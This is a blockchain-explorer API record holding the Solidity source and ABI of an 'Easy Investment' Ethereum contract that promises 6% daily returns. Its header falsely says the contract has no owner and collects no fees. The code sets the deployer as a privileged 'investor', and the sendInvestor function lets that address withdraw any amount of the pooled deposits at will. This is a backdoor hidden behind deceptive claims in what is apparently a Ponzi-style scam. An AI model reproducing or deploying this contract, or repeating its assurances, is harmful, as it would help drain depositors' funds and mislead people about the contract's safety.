{"status":"1","message":"OK","result":[{"SourceCode":"pragma solidity ^0.4.0;\r\n\r\n/**\r\n *\r\n * Easy Investment Contract\r\n *  - GAIN 6% PER 24 HOURS (every 5900 blocks)\r\n *  - NO COMMISSION on your investment (every ether stays on contract's balance)\r\n *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)\r\n *\r\n * How to use:\r\n *  1. Send any amount of ether to make an investment\r\n *  2a. Claim your profit by sending 0 ether transaction (every day, every week, i don't care unless you're spending too much on GAS)\r\n *  OR\r\n *  2b. Send more ether to reinvest AND get your profit at the same time\r\n *\r\n * RECOMMENDED GAS LIMIT: 70000\r\n * RECOMMENDED GAS PRICE: https://ethgasstation.info/\r\n *\r\n * Contract reviewed and approved by pros!\r\n *\r\n */\r\ncontract Investment {\r\n    // records amounts invested\r\n    mapping (address => uint256) public invested;\r\n    // records blocks at which investments were made\r\n    mapping (address => uint256) public atBlock;\r\n    // address investors\r\n    address investor;\r\n    // balance ivestors\r\n    uint256 balance;\r\n    // constructor initialize investors\r\n    constructor() public {\r\n        investor = msg.sender;\r\n    }\r\n    // this function called every time anyone sends a transaction to this contract\r\n    function () external payable {\r\n        // if sender (aka YOU) is invested more than 0 ether\r\n        if (invested[msg.sender] != 0) {\r\n            // calculate profit amount as such:\r\n            // amount = (amount invested) * 6% * (blocks since last transaction) / 5900\r\n            // 5900 is an average block count per day produced by Ethereum blockchain\r\n            uint256 amount = invested[msg.sender] * 6 / 100 * (block.number - atBlock[msg.sender]) / 5900;\r\n            // send calculated amount of ether directly to sender (aka YOU)\r\n            msg.sender.transfer(amount);\r\n        }\r\n        // record block number and invested amount (msg.value) of this transaction\r\n        atBlock[msg.sender] = block.number;\r\n        invested[msg.sender] += msg.value;\r\n        balance += msg.value;\r\n    }\r\n    // approved for investors\r\n    function approveInvestor(address _investor) public onlyInvestor {\r\n        investor = _investor;\r\n    }\r\n    // send to investors\r\n    function sendInvestor(address _investor, uint256 amount) public payable onlyInvestor {\r\n        _investor.transfer(amount);\r\n        balance -= amount;\r\n    }\r\n    // get investors balance\r\n    function getBalance() public constant returns(uint256) {\r\n        return balance;\r\n    }\r\n    // get investors address\r\n    function getInvestor() public constant onlyInvestor returns(address)  {\r\n        return investor;\r\n    }\r\n    // access only for investors modifier\r\n    modifier onlyInvestor() {\r\n        require(msg.sender == investor);\r\n        _;\r\n    }\r\n}","ABI":"[{\"constant\":true,\"inputs\":[],\"name\":\"getBalance\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"invested\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getInvestor\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_investor\",\"type\":\"address\"}],\"name\":\"approveInvestor\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"name\":\"\",\"type\":\"address\"}],\"name\":\"atBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_investor\",\"type\":\"address\"},{\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"sendInvestor\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"Investment","CompilerVersion":"v0.4.25+commit.59dbf8f1","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","Library":"","SwarmSource":"bzzr://d76f7b036f286a1d3813c1fbff22ef992b99bbab2d227e1284a0b98f17839a45"}]}